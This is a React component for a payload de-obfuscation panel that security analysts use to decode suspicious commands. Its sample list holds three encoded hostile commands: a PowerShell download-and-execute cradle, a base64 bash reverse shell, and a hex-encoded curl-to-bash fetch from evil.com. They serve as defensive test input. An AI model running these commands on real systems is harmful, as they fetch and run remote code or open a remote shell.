import React, { useState } from 'react';
import ThreatIntelCard from './ThreatIntelCard';
import { Terminal, Zap, Cpu, Loader2, AlertTriangle, History, Trash2 } from 'lucide-react';
import { sanitizeHTML } from '../../utils/sanitizer';

/**
 * PayloadAnalyzer - On-demand payload decoding component
 * 
 * Allows security analysts to:
 * 1. Paste a suspicious payload (Base64, PowerShell -e, hex, etc.)
 * 2. Choose analysis mode (Full AI + Local, or Light local-only)
 * 3. View decoded results inline with ThreatIntelCard
 * 4. Keep a history of recent analyses
 */
const PayloadAnalyzer = () => {
    const [payload, setPayload] = useState('');
    const [result, setResult] = useState(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [mode, setMode] = useState('full');
    const [history, setHistory] = useState([]);

    const EXAMPLE_PAYLOADS = [
        {
            label: 'PowerShell Encoded',
            value: 'cmd.exe /c powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADoAOAAwADgAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=',
        },
        {
            label: 'Base64 Reverse Shell',
            value: 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=" | base64 -d | bash',
        },
        {
            label: 'Hex Encoded Payload',
            value: '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x2e\\x73\\x68\\x20\\x7c\\x20\\x62\\x61\\x73\\x68',
        },
    ];

    const handleAnalyze = async () => {
        if (!payload.trim()) return;

        setLoading(true);
        setError(null);
        setResult(null);

        try {
            const response = await fetch('/api/ai/decode-payload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-admin-token': localStorage.getItem('adminToken'),
                },
                body: JSON.stringify({ payload: payload.trim(), mode }),
            });

            if (!response.ok) {
                const err = await response.json();
                throw new Error(err.error || 'Analysis failed');
            }

            const data = await response.json();
            setResult(data);

            // Add to history
            setHistory(prev => [{
                payload: payload.trim().substring(0, 80) + (payload.length > 80 ? '...' : ''),
                technique: data.technique,
                risk: data.risk_level,
                timestamp: new Date().toLocaleTimeString(),
                fullResult: data,
                fullPayload: payload.trim(),
            }, ...prev.slice(0, 9)]);

        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const loadFromHistory = (item) => {
        setPayload(item.fullPayload);
        setResult(item.fullResult);
    };

    return (
        <div style={{ padding: '24px' }}>
            {/* Header */}
            <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                marginBottom: '24px',
            }}>
                <div style={{
                    width: '48px',
                    height: '48px',
                    borderRadius: '12px',
                    background: 'linear-gradient(135deg, #7c3aed, #ec4899)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                }}>
                    <Terminal size={24} color="#fff" />
                </div>
                <div>
                    <h2 style={{ margin: 0, fontSize: '1.4rem', fontWeight: 800, color: '#e2e8f0' }}>
                        Payload De-Obfuscation Lab
                    </h2>
                    <p style={{ margin: 0, fontSize: '0.85rem', color: '#94a3b8' }}>
                        Decode Base64, PowerShell -e, hex, and URL-encoded payloads in real-time
                    </p>
                </div>
            </div>

            {/* Input Area */}
            <div style={{
                background: 'rgba(15,23,42,0.6)',
                border: '1px solid rgba(148,163,184,0.15)',
                borderRadius: '12px',
                padding: '20px',
                marginBottom: '20px',
            }}>
                <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    marginBottom: '12px',
                }}>
                    <label style={{
                        color: '#94a3b8',
                        fontSize: '0.8rem',
                        textTransform: 'uppercase',
                        fontWeight: 700,
                        letterSpacing: '0.05em',
                    }}>
                        Paste Suspicious Payload
                    </label>

                    {/* Example Payloads Dropdown */}
                    <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
                        {EXAMPLE_PAYLOADS.map((ex, i) => (
                            <button
                                key={i}
                                onClick={() => setPayload(ex.value)}
                                style={{
                                    background: 'rgba(99,102,241,0.1)',
                                    border: '1px solid rgba(99,102,241,0.2)',
                                    borderRadius: '6px',
                                    color: '#818cf8',
                                    fontSize: '0.7rem',
                                    padding: '4px 10px',
                                    cursor: 'pointer',
                                    transition: 'all 0.2s',
                                    fontWeight: 600,
                                }}
                                onMouseEnter={e => {
                                    e.target.style.background = 'rgba(99,102,241,0.2)';
                                    e.target.style.color = '#a5b4fc';
                                }}
                                onMouseLeave={e => {
                                    e.target.style.background = 'rgba(99,102,241,0.1)';
                                    e.target.style.color = '#818cf8';
                                }}
                                title={`Load: ${ex.label}`}
                            >
                                📋 {ex.label}
                            </button>
                        ))}
                    </div>
                </div>

                <textarea
                    value={payload}
                    onChange={e => setPayload(e.target.value)}
                    placeholder="cmd.exe /c powershell -e aBgYxh... or any obfuscated command"
                    style={{
                        width: '100%',
                        minHeight: '120px',
                        background: '#000',
                        border: '1px solid rgba(148,163,184,0.15)',
                        borderRadius: '8px',
                        color: '#e2e8f0',
                        fontFamily: '"Fira Code", "Cascadia Code", monospace',
                        fontSize: '0.85rem',
                        padding: '14px',
                        resize: 'vertical',
                        outline: 'none',
                        lineHeight: 1.5,
                        boxSizing: 'border-box',
                    }}
                    onFocus={e => e.target.style.borderColor = 'rgba(168,85,247,0.5)'}
                    onBlur={e => e.target.style.borderColor = 'rgba(148,163,184,0.15)'}
                />

                {/* Action Bar */}
                <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    marginTop: '14px',
                }}>
                    {/* Mode Toggle */}
                    <div style={{
                        display: 'flex',
                        gap: '8px',
                        alignItems: 'center',
                    }}>
                        <span style={{ color: '#64748b', fontSize: '0.75rem', fontWeight: 600 }}>Mode:</span>
                        <button
                            onClick={() => setMode('full')}
                            style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '5px',
                                padding: '6px 14px',
                                borderRadius: '6px',
                                border: mode === 'full' ? '1px solid rgba(168,85,247,0.5)' : '1px solid rgba(148,163,184,0.15)',
                                background: mode === 'full' ? 'rgba(168,85,247,0.15)' : 'transparent',
                                color: mode === 'full' ? '#c084fc' : '#64748b',
                                cursor: 'pointer',
                                fontSize: '0.8rem',
                                fontWeight: 600,
                                transition: 'all 0.2s',
                            }}
                        >
                            <Cpu size={14} /> Full (AI + Local)
                        </button>
                        <button
                            onClick={() => setMode('light')}
                            style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '5px',
                                padding: '6px 14px',
                                borderRadius: '6px',
                                border: mode === 'light' ? '1px solid rgba(250,204,21,0.5)' : '1px solid rgba(148,163,184,0.15)',
                                background: mode === 'light' ? 'rgba(250,204,21,0.1)' : 'transparent',
                                color: mode === 'light' ? '#facc15' : '#64748b',
                                cursor: 'pointer',
                                fontSize: '0.8rem',
                                fontWeight: 600,
                                transition: 'all 0.2s',
                            }}
                        >
                            <Zap size={14} /> Light (Local Only)
                        </button>
                    </div>

                    {/* Analyze Button */}
                    <div style={{ display: 'flex', gap: '8px' }}>
                        {payload && (
                            <button
                                onClick={() => { setPayload(''); setResult(null); setError(null); }}
                                style={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: '5px',
                                    padding: '10px 16px',
                                    borderRadius: '8px',
                                    background: 'rgba(239,68,68,0.1)',
                                    border: '1px solid rgba(239,68,68,0.2)',
                                    color: '#f87171',
                                    cursor: 'pointer',
                                    fontSize: '0.85rem',
                                    fontWeight: 700,
                                }}
                            >
                                <Trash2 size={14} /> Clear
                            </button>
                        )}
                        <button
                            onClick={handleAnalyze}
                            disabled={loading || !payload.trim()}
                            style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '8px',
                                padding: '10px 24px',
                                borderRadius: '8px',
                                background: loading ? 'rgba(168,85,247,0.2)' : 'linear-gradient(135deg, #7c3aed, #ec4899)',
                                border: 'none',
                                color: '#fff',
                                cursor: loading ? 'wait' : 'pointer',
                                fontSize: '0.9rem',
                                fontWeight: 700,
                                transition: 'all 0.2s',
                                opacity: !payload.trim() ? 0.5 : 1,
                                boxShadow: '0 4px 16px rgba(124,58,237,0.3)',
                            }}
                        >
                            {loading ? (
                                <>
                                    <Loader2 size={16} style={{ animation: 'spin 1s linear infinite' }} />
                                    Analyzing...
                                </>
                            ) : (
                                <>
                                    <Terminal size={16} />
                                    🔓 Decode Payload
                                </>
                            )}
                        </button>
                    </div>
                </div>
            </div>

            {/* Error Display */}
            {error && (
                <div style={{
                    background: 'rgba(239,68,68,0.1)',
                    border: '1px solid rgba(239,68,68,0.3)',
                    borderRadius: '8px',
                    padding: '12px 16px',
                    marginBottom: '16px',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                }}>
                    <AlertTriangle size={16} style={{ color: '#ef4444' }} />
                    <span style={{ color: '#fca5a5', fontSize: '0.85rem' }}>{error}</span>
                </div>
            )}

            {/* Result Display */}
            {result && (
                <ThreatIntelCard intel={result} rawPayload={payload} />
            )}

            {/* Analysis History */}
            {history.length > 0 && (
                <div style={{
                    marginTop: '24px',
                    background: 'rgba(15,23,42,0.4)',
                    border: '1px solid rgba(148,163,184,0.1)',
                    borderRadius: '12px',
                    padding: '16px',
                }}>
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px',
                        marginBottom: '12px',
                        color: '#94a3b8',
                        fontSize: '0.8rem',
                        fontWeight: 700,
                        textTransform: 'uppercase',
                    }}>
                        <History size={16} /> Analysis History
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                        {history.map((item, idx) => (
                            <div
                                key={idx}
                                onClick={() => loadFromHistory(item)}
                                style={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'space-between',
                                    padding: '8px 12px',
                                    borderRadius: '6px',
                                    cursor: 'pointer',
                                    background: 'rgba(30,41,59,0.5)',
                                    transition: 'all 0.2s',
                                }}
                                onMouseEnter={e => e.currentTarget.style.background = 'rgba(30,41,59,0.8)'}
                                onMouseLeave={e => e.currentTarget.style.background = 'rgba(30,41,59,0.5)'}
                            >
                                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <span style={{
                                        fontSize: '0.7rem',
                                        color: '#64748b',
                                        fontFamily: 'monospace',
                                    }}>
                                        {item.timestamp}
                                    </span>
                                    <span style={{
                                        color: '#e2e8f0',
                                        fontSize: '0.8rem',
                                        fontFamily: 'monospace',
                                        maxWidth: '400px',
                                        overflow: 'hidden',
                                        textOverflow: 'ellipsis',
                                        whiteSpace: 'nowrap',
                                    }}>
                                        {sanitizeHTML(item.payload)}
                                    </span>
                                </div>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                    <span style={{
                                        fontSize: '0.7rem',
                                        color: '#94a3b8',
                                        background: 'rgba(148,163,184,0.1)',
                                        padding: '2px 8px',
                                        borderRadius: '4px',
                                    }}>
                                        {item.technique}
                                    </span>
                                    <span style={{
                                        fontSize: '0.7rem',
                                        fontWeight: 700,
                                        padding: '2px 8px',
                                        borderRadius: '4px',
                                        background: item.risk > 7 ? 'rgba(239,68,68,0.2)' : item.risk > 4 ? 'rgba(245,158,11,0.2)' : 'rgba(34,197,94,0.2)',
                                        color: item.risk > 7 ? '#f87171' : item.risk > 4 ? '#fbbf24' : '#4ade80',
                                    }}>
                                        {item.risk}/10
                                    </span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* CSS for animations */}
            <style>{`
                @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

export default PayloadAnalyzer;
